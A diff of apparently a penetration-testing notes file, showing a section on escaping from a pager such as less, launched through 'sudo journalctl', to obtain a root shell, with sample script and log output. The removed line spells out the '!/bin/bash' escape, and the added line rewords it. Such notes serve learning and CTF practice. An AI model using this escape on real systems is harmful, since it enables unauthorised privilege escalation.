@@ -754,12 +754,15 @@ Nov 19 00:05:01 sun CRON[5701]: (root) CMD (python /home/sun/Documents/script.py
 
 ### More or Less Command 
 
-- If any file we found in low priv user and it contains something like this, we can execute it and minimize the size of terminal to enter the visual mode and enter `!/bin/bash` to get root shell
+- If any file we found in low priv user and it contains something like this, we can execute it and minimize the size of terminal to enter the visual mode to gain root access.
+
 ```
 > $ cat new.sh 
 #!/bin/bash
 /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-  
+```
+
+```
 > $ sh new.sh 
 -- Logs begin at Sun 2019-11-17 19:19:25 EST, end at Mon 2019-11-18 17:13:44 EST. --
 Nov 18 17:02:26 kali sudo[11538]: pam_unix(sudo:auth): authentication failure; logname= uid=33 eu
